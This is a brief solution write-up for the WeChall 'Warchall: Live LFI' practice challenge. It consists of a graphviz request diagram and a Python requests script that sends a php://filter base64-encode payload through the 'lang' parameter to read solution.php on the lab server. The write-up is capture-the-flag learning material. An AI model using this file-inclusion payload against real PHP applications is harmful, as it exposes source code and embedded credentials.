================================================================================================================
[wechall] Warchall: Live LFI
================================================================================================================

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9;
        }
        step0 -> step1[label="index.php?lang=php://filter/convert.base64-encode/resource=solution.php',true);?>",arrowhead="normal"];
        step3 -> step2[label="@solve",arrowhead="normal"];
    }

|


solve
================================================================================================================


.. code-blcok:: python

    import requests


    url = "http://lfi.warchall.net/index.php"

    params = {
        "lang": "php://filter/convert.base64-encode/resource=solution.php"
    }

    r = requests.get(url, params=params, verify=False)
    print r.content
